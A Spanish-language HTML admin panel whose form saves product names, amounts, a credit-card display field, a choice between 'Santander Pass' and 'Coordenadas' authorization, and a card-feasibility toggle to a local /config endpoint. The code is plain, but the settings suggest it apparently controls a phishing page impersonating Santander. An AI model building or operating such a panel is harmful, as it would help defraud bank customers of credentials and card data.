<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Panel de Administración</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: Arial, sans-serif; margin: 20px; }
    h2 { color: red; }
    .campo { margin-bottom: 15px; }
    label { display: block; font-weight: bold; margin-bottom: 5px; }
    input, select { padding: 8px; width: 100%; }
    button { background-color: red; color: white; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }
    #mensaje { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h2>Panel de Administración</h2>

  <form id="configForm">
    <div class="campo">
      <label for="producto1">Producto 1</label>
      <input type="text" id="producto1" name="producto1">
      <label for="monto1">Monto Producto 1</label>
      <input type="number" id="monto1" name="monto1">
    </div>

    <div class="campo">
      <label for="producto2">Producto 2</label>
      <input type="text" id="producto2" name="producto2">
      <label for="monto2">Monto Producto 2</label>
      <input type="number" id="monto2" name="monto2">
    </div>

    <div class="campo">
      <label for="producto3">Producto 3</label>
      <input type="text" id="producto3" name="producto3" placeholder="Visualización de Tarjeta de Crédito">
    </div>

    <div class="campo">
      <label for="tipoAutorizacion">Tipo de Autorización</label>
      <select id="tipoAutorizacion" name="tipoAutorizacion">
        <option value="santander">Santander Pass</option>
        <option value="coordenadas">Coordenadas</option>
      </select>
    </div>

    <div class="campo">
      <label for="factibilidad">Factibilidad de Tarjeta</label>
      <select id="factibilidad" name="factibilidad">
        <option value="off">Deshabilitada</option>
        <option value="on">Habilitada</option>
      </select>
    </div>

    <button type="submit">Guardar Configuración</button>
  </form>

  <div id="mensaje"></div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const API_URL = "/config";
      const form = document.getElementById("configForm");
      const mensaje = document.getElementById("mensaje");

      // Cargar configuración actual
      fetch(API_URL)
        .then(res => res.json())
        .then(cfg => {
          document.getElementById("producto1").value = cfg.producto1 || "";
          document.getElementById("monto1").value = cfg.monto1 || "";
          document.getElementById("producto2").value = cfg.producto2 || "";
          document.getElementById("monto2").value = cfg.monto2 || "";
          document.getElementById("producto3").value = cfg.producto3 || "";
          document.getElementById("tipoAutorizacion").value = cfg.tipoAutorizacion || "santander";
          document.getElementById("factibilidad").value = cfg.factibilidad || "off";
        })
        .catch(err => {
          console.error("Error al cargar configuración:", err);
          mensaje.innerText = "⚠️ No se pudo cargar configuración.";
        });

      // Guardar cambios
      form.addEventListener("submit", e => {
        e.preventDefault();
        const data = {
          producto1: document.getElementById("producto1").value,
          monto1: parseInt(document.getElementById("monto1").value) || 0,
          producto2: document.getElementById("producto2").value,
          monto2: parseInt(document.getElementById("monto2").value) || 0,
          producto3: document.getElementById("producto3").value,
          tipoAutorizacion: document.getElementById("tipoAutorizacion").value,
          factibilidad: document.getElementById("factibilidad").value
        };

        fetch(API_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        })
        .then(res => res.json())
        .then(cfg => {
          mensaje.innerText = "✅ Configuración guardada correctamente.";
        })
        .catch(err => {
          console.error("Error al guardar configuración:", err);
          mensaje.innerText = "❌ Error al guardar configuración.";
        });
      });
    });
  </script>
</body>
</html>
